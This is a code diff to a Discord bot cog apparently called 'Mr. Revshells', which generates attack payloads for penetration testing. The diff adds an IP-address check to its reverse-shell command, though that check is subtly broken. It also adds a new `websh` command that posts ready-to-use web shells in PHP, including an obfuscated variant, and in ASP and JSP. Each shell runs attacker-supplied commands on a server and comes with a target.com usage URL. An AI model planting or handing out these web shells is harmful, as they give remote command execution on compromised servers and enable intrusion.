@@ -1,9 +1,11 @@
-import discord
 from discord.ext import commands
+import discord
 import logging
+import ipaddress
 
 logger = logging.getLogger("RS-Commands")
 RS_TYPES = ["bash-i", "bash196", "readline", "mkfifo", "py1", "py2", "nc-e", "nc-c", "lua"]
+WEBSH_TYPES = ["php0", "php-cmd", "php-obf", "asp", "jsp"]
 
 class ReverseShellCog(commands.Cog):
     def __init__(self, bot):
@@ -25,6 +27,10 @@ class ReverseShellCog(commands.Cog):
         if port < 1 or port > 65535:
             logger.error(f" Invalid port number for reverse shell: {port}\n")
             return await ctx.send("Invalid port number. (Range 1-65535)")
+
+        if not ipaddress.IPv4Address(ip):
+            logger.error(f" Invalid IP address: {ip}\n")
+            return await ctx.send("Invalid IP address format.")
 
         if type.lower() not in RS_TYPES:
                 logger.error(f" Invalid type: {type}\n")
@@ -62,7 +68,7 @@ class ReverseShellCog(commands.Cog):
 
         embed = discord.Embed(
             title = f"Reverse Shell Generator 💀",
-            description = f"""◈ **Type**: {type}\n\n◈ **IP**: {ip}\n\n◈ **Port**: {port}\n\n {payload} \n❗ This payload is for **Linux** only. If they are not working, try **UDP** instead of **TCP**. If you are using _code langs_ options, try to use different binary versions if doesn't work.""",
+            description = f"""◈ **Type**: {type}\n\n◈ **IP**: {ip}\n\n◈ **Port**: {port}\n\n {payload} \n❗ These shell payloads are for **Linux** only. If they are not working, try **UDP** instead of **TCP**. If you are using _code langs_ options, try to use different binary versions if doesn't work.""",
             colour = discord.Colour.dark_red()
         )
         embed.set_footer(text="Shhhh, I'm a secret agent! 🕵️‍♂️")
@@ -72,6 +78,56 @@ class ReverseShellCog(commands.Cog):
         logger.info(f" Sent {type} reverse shell to {ctx.author.name}\n")
         await ctx.send(embed=embed)
 
+    @commands.command(help="Generate a payload for a web shell depending on the type of shell asked \n Usage: `!websh <type>`\n Types: `php0`, `php-cmd`, `php-obf`, `asp`, `jsp`")
+    async def websh(self, ctx, type: str):
+        """Generate a payload for a web shell depending on the type of shell asked.
+        
+        Args:
+            type (str): Type of web shell to generate. Possible values: `php0`, `php-cmd`, `php-obf`, `asp`, `jsp`.
+        """
+        logger.info(f" Received request for web shell: {type} \nUser: {ctx.author.name}\nServer: {ctx.guild.name}\nChannel: {ctx.channel.name}\n")
+        await ctx.message.add_reaction("💀")
+        
+        
+        # Pre-Conditions
+        if type.lower() not in WEBSH_TYPES:
+            logger.error(f" Invalid type: {type}\n")
+            return await ctx.send("Invalid type. See the help message for the list of valid types.")
+
+
+        match type.lower():
+            case "php0":
+                payload = f"```php\n<?php system($_GET['cmd']); ?>```"
+                usage = "```http://target.com/shell.php?cmd=command```"
+
+
+            case "php-cmd":
+                payload = f"```php\n<?=`$_GET[0]`?>```"
+                usage = "```http://target.com/shell.php?0=command```"
+
+            case "php-obf":
+                payload = f"```php\n<?=$_="";$_=\"'\" ;$_=($_^chr(4*4*(5+5)-40)).($_^chr(47+ord(1==1))).($_^chr(ord(\'_\')+3)).($_^chr(((10*10)+(5*3))));$_=${$_}[\'_\'^\'o\'];echo`$_`?>```"
+                usage = "```http://target.com/shell.php?_cmd=command```"
+
+            case "asp":
+                payload = "```asp\n<%Set c=CreateObject(\"WScript.Shell\"):Set r=c.Exec(Request(\"cmd\")):Response.Write(\"<pre>\"&r.StdOut.ReadAll()&\"</pre>\")%>```"
+                usage = "```http://target.com/shell.asp?cmd=command```"
+
+            case "jsp":
+                payload = "```js\n<%@page import=\"java.io.*\"%><%Process p=Runtime.getRuntime().exec(request.getParameter(\"cmd\"));BufferedReader r=new BufferedReader(new InputStreamReader(p.getInputStream()));String l;while((l=r.readLine())!=null){out.println(l+\"<br>\");}%>```"
+                usage = "```http://target.com/shell.jsp?cmd=whoami```"
+
+        embed = discord.Embed(
+            title = "Web Shell Generator 💀",
+            description = f"""◈ **Type**: {type}\n\n◈ **Usage**: {usage} \n◈ **Payload**: \n{payload}""",
+            colour = discord.Colour.dark_red()
+            )
+        embed.set_footer(text="Shhhh, I'm a secret agent! 🕵️‍♂️")
+        embed.set_thumbnail(url="https://play.pokemonshowdown.com/sprites/trainers/blaine.png")
+        embed.set_author(name="Mr. Revshells", icon_url="https://play.pokemonshowdown.com/sprites/trainers/blaine.png")
+
+        logger.info(f" Sent {type} web shell to {ctx.author.name}\n")
+        await ctx.send(embed=embed)
 
 
     @commands.command(help="Give a cheatsheet to establish a full interactive TTY session after achieving a reverse shell.\nUsage: !tty")
@@ -99,6 +155,8 @@ class ReverseShellCog(commands.Cog):
 
         logger.info(f" Sent TTY cheatsheet to {ctx.author.name}\n")
         await ctx.send(embed=embed)
+
+
 
 
 
